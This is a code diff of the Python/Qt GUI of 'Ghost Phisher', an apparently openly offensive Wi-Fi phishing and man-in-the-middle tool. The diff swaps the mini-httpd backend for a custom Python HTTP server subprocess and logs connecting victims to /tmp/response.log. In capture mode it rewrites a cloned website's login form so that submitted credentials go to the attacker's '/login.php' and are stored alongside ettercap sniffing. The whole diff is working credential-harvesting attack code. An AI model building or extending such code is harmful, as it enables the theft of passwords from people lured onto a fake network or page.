@@ -23,6 +23,7 @@ from settings import *
 cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
                                                                          # Thats because the HTTP server changes directory after launch
 
+
 #
 # Global variables
 #
@@ -39,9 +40,6 @@ dhcp_installation_status = ''                                 # Holds the DHCP i
 dhcp_server_binary = ''
 dhcp_config_file = "/tmp/ghost_dhcpd.conf"
 dhcp_pid_file = "/tmp/ghost_dhcpd.pid"
-
-# Global variables for Fake HTTP
-http_installation_status = ''                                 # Holds the HTTP installation status
 
 # Global variables for Sniffer process
 ettercap_installation_status = ''                                 # Holds the ettercap installation status
@@ -1117,24 +1115,9 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
                 self.dhcp_status.append('<font color=green>To Install DHCP3 Server run:</font>\t<font color=red>apt-get install dhcp3-server</font>')
                 dhcp_installation_status = 'not installed'
         #
-        # Check if mini-httpd Server service is installed on the computer
+        # Check if ettercap Server service is installed on the computer
         #
-        global http_installation_status
         global ettercap_installation_status
-
-        installalation_status = commands.getstatusoutput('which mini-httpd')
-        if installation_status[0] != 0:
-            self.status_textbrowser_http.append('<font color=red>HTTP Server is not installed</font>')
-            self.status_textbrowser_http.append('<font color=green>To Install HTTP Server run:</font>\t<font color=red>apt-get install mini-httpd</font>')
-            http_installation_status = 'not installed'
-            self.http_interface_combo.setEnabled(False)
-            self.http_ip_combo.setEnabled(False)
-            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  Deactivated")
-            self.http_port_label.setText('<font color=green>TCP Port:</font> Not Started')
-            self.groupBox_8.setEnabled(False)
-            self.http_start.setEnabled(False)
-
-        self.status_textbrowser_http.append('')
 
         installation_status = commands.getstatusoutput('which ettercap')
         if installation_status[0] != 0:
@@ -1248,10 +1231,6 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         self.current_card_label.setText("<font color=green>Current Interface:</font>  %s"%(selected_interface))
 
 
-        selected_http_interface = str(self.http_interface_combo.currentText())
-        if http_installation_status != 'not installed':
-            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  %s"%(selected_http_interface))
-
         # Add channel list to fake access point combo
         channels = []
         for iterate in range(1,14):
@@ -1289,8 +1268,8 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         self.connect(self,QtCore.SIGNAL("system interrupt"),self.dns_system_interrupt)
         self.connect(self,QtCore.SIGNAL("dns stopped"),self.stop_dns)
         self.connect(self,QtCore.SIGNAL("new client connection"),self.update_dns_connections)
-        self.connect(self,QtCore.SIGNAL("new connection"),self.new_connection)
         self.connect(self,QtCore.SIGNAL('new credential'),self.new_credential)
+        self.connect(self,QtCore.SIGNAL('new remote host'),self.new_host)
         self.connect(self,QtCore.SIGNAL("run tips"),self.run_tips)
         self.connect(self,QtCore.SIGNAL("access point output"),self.update_access_output)
         self.connect(self,QtCore.SIGNAL("access point error"),self.update_access_error)
@@ -1970,36 +1949,64 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
     #       FAKE HTTP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
     #########################################################################
 
-    def HTTP_Server(self,http_server_port,working_directory):                  # HTTP Server Thread
-        '''HTTP Server thread, uses mini-httpd webserver'''
-        # Clear logfile
-        if 'http_logfile' in os.listdir('/tmp/'):
-            os.remove('/tmp/http_logfile')
-        http_server_launch = commands.getstatusoutput('mini-httpd -p %d -dd %s -l /tmp/http_logfile'% \
-                                                    (http_server_port,working_directory))
+    def HTTP_initialization(self):
+        '''Starts and read HTTP server responces'''
+        global http_terminal
+        global http_control
+        global request_response
+        global http_server_port
+
+        html_folder = ''                                        # Get the html resource directory e.g index_files
+        for file_ in os.listdir(cwd + '/HTTP-Webscript/'):
+            if os.path.isdir(cwd + '/HTTP-Webscript/' + file_):
+                html_folder += file_
+
+        http_terminal = subprocess.Popen('python %s %d %s %s'%\
+                                (cwd+'/core/http_core.py',http_server_port,
+                                html_folder,cwd),shell=True,stdout=subprocess.PIPE,
+                                stdin=subprocess.PIPE)   # python http_core.py '0.0.0.0' '80' 'index_files'
+
+
+    def new_connection(self):
+        '''Detects changes to log file and emits signal'''
+        global http_control
+        connection_index = int()        # connection_index = 0
+        while http_control == 0:
+            time.sleep(3)
+            log_file = open('/tmp/response.log')
+            log_read = log_file.read()
+            log_file.close()
+            if connection_index != len(log_read.splitlines()):
+                self.emit(QtCore.SIGNAL('new remote host'))
+                connection_index += 1
+
+
+    def new_host(self):
+        '''Displays connection details to http text browser'''
+        log_file = open('/tmp/response.log')
+        host_details = log_file.read().splitlines()
+        self.status_textbrowser_http.append('<font color=blue>%s</font>'%(host_details[-1]))
+
 
 
     def stop_http(self):
         ''' Stop the DHCP Server'''
+        global http_terminal
         global http_control
         global http_address                 # Holds the address where Fake HTTP server is running e.g http://192.168.0.1/
         http_control = 1
         self.http_start.setEnabled(True)
+        try:
+            commands.getstatusoutput('kill -9 %s'%(http_terminal.pid))               # Kill GhostHTTPServer's subprocess
+            commands.getstatusoutput('killall ettercap')
+        except IOError:pass
         self.http_stop.setEnabled(False)
-        commands.getstatusoutput('killall mini-httpd')
-        commands.getstatusoutput('killall ettercap')
+
         self.status_textbrowser_http.append('<font color=red>HTTP Server Stopped at: %s</font>'%(time.ctime()))
         self.http_ip_label.setText('<font color=green>Service running on:</font>  Service not started')
         self.label_13.setText('<font color=green>Runtime:</font>  Service not started')
 
-    def new_connection(self):
-        ''' Updates the http textbrowser with
-            connection details of a new client
-        '''
-        read_http_log = open('/tmp/http_logfile')
-        http_details = read_http_log.read().splitlines()
-        self.status_textbrowser_http.append('<font color=blue>%s</font>'\
-                                    %(http_details[-1]))
+
 
     def sniff_thread(self):
         ''' Thread launches ettercap as the sniffing
@@ -2029,25 +2036,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
                     self.database_commit(website,username,password)
                     self.emit(QtCore.SIGNAL('new credential'))
 
-
-
-
-
-    def http_update_thread(self):
-        ''' This thread checks the '/tmp/http_logfile'
-            for new connections
-        '''
-        global http_control
-        connection_number = 0
-
-        while http_control == 0:
-            time.sleep(2)
-            connection_file = open('/tmp/http_logfile')
-            new_connection_number = connection_file.read().splitlines()
-            connection_file.close()
-            if connection_number != len(new_connection_number):
-                connection_number += 1
-                self.emit(QtCore.SIGNAL("new connection"))
 
 
     def new_credential(self):
@@ -2135,15 +2123,9 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         ''' Evaluates user settings and launches
             webserver to host web-script
         '''
-        global http_installation_status
-
         self.status_textbrowser_http.clear()
 
-        if http_installation_status == 'not installed':
-            self.status_textbrowser_http.append('<font color=red>HTTP Server is not installed</font>')
-            self.status_textbrowser_http.append('<font color=green>To Install HTTP Server run:</font>\t<font color=red>apt-get install mini-httpd</font>')
-
-        elif self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
+        if self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
             if len(str(self.lineEdit_2.text())) < 3:
                 QtGui.QMessageBox.warning(self,'Invalid URL or IP address','Please input the original url or ip address of the spoofed website')
             else:
@@ -2154,20 +2136,11 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
     def start_http_service(self):
         '''Starts the HTTP Service'''
+        global html_source
         global http_address
         global http_server_port
 
         http_error = 0               # Informs conditional blocks of success of other blocks
-
-        if 'website_url.log' in os.listdir(os.sep + 'tmp' + os.sep):
-            os.remove(os.sep + 'tmp' + os.sep + 'website_url.log')
-
-        if 'new_connection.log' in os.listdir(os.sep + 'tmp' + os.sep):
-            os.remove(os.sep + 'tmp' + os.sep + 'new_connection.log')
-        credential_signal = open(os.sep + 'tmp' + os.sep + 'new_connection.log','a+')
-        os.chmod('/tmp/new_connection.log',0777)                                        # Same as linux terminals: "chmod 777 /tmp/new_connection.log"
-        credential_signal.close()
-
 
 
         if self.run_webpage_port_radio.isChecked() == True:     # Check if http port section has been changed
@@ -2221,7 +2194,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
                     if response[0] != 0:
                         if html_file_folder == '':
                             self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')
-                            self.status_textbrowser_http.append('<font color=green>Generating CGI script for handling POST request</font>')
                         else:
                             self.status_textbrowser_http.append('<font color=red>Failed to move webscript files to Web-Server directory: %s</font>'%(response[1]))
                             http_error += 1
@@ -2267,9 +2239,10 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             else:
                 http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)    # Evaluate server address e,g http://192.168.0.23:8080/
 
+        html_file = open('%s/HTTP-Webscript/index.html'%(cwd))
+        html_source = html_file.read()
+
         if self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
-            html_file = open('%s/HTTP-Webscript/index.html'%(cwd))
-            html_source = html_file.read()
 
             locate_form_action = html_source.find('action')
             index_forms_end = html_source[locate_form_action:-1]
@@ -2277,7 +2250,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
             action_string = index_forms_end[0:index_form_length]
 
-            new_post_action = html_source.replace(action_string,"action=" + http_address) # Replaces action variable with ours e.g <action="http://192.168.0.23/">
+            new_post_action = html_source.replace(action_string,'action="/login.php"') # Replaces action variable with ours e.g <action="http://192.168.0.23/login.php">
             create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
             #
             # Check if html source has a valid Post action method
@@ -2305,12 +2278,20 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             self.http_ip_label.setText('<font color=green>Service running on:</font>  %s'%(actions_ip_address))
             self.label_13.setText('<font color=green>Runtime:</font>  %s'%(time.ctime()))
 
-            http_working_directory = cwd + os.sep + 'HTTP-Webscript'            # e.g /root/Desktop/HTTP-Webscript
+            if os.path.exists('/tmp/original.html'):                    # Delete original source if it already exist in the tmp directory
+                os.remove('/tmp/original.html')
 
-            thread.start_new_thread(self.HTTP_Server,(http_server_port,http_working_directory))      # Starts the HTTP Server
+            if os.path.exists('/tmp/response.log'):
+                os.remove('/tmp/response.log')
+            os.open('/tmp/response.log',0777)                                # Open file for remote host logging
 
+            original_source = open('/tmp/original.html','a+')
+            original_source.write(html_source)
+            original_source.close()
 
+            thread.start_new_thread(self.HTTP_initialization,())        # Start HTTP Sever thread
 
+            thread.start_new_thread(self.new_connection,())
 
             if http_server_port == 80:
                 http_address = 'http://%s/'%(actions_ip_address)
@@ -2319,10 +2300,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
                 http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)
                 self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
 
-            thread.start_new_thread(self.http_update_thread,())                  # Runs the thread loop that checks for new inputs to database
             self.status_textbrowser_http.append('')
-
-
 
 
 
@@ -2414,12 +2392,16 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         ''' Close Network connections after
             user exits application
         '''
+        global http_terminal
         answer = QtGui.QMessageBox.question(self,"Ghost Phisher","Are you sure you want to quit?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
         if answer == QtGui.QMessageBox.Yes:
             if dns_contol == 0:
                 self.stop_dns()
-            commands.getstatusoutput('killall mini-httpd')
-            commands.getstatusoutput('killall ettercap')
+            if http_control == 0:
+                try:
+                    commands.getstatusoutput('kill -9 %s'%(http_terminal.pid))
+                    commands.getstatusoutput('killall ettercap')
+                except IOError:pass
             try:
                 commands.getstatusoutput('killall airbase-ng')
                 self.stop_dhcp()
